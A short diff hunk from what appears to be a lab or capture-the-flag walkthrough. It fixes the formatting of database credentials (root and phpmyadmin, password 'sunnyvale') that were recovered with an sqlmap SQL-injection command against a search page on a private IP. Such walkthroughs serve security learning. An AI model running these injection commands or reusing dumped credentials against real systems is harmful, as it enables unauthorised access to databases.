@@ -112,7 +112,7 @@ sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql
 ```
 sqlmap returns:
 * User: ***root*** | Password: ***sunnyvale***
-* User: ***phpmyadmin*** | sunnyvale***
+* User: ***phpmyadmin*** | ***sunnyvale***
 
 ### 'seth' table
 
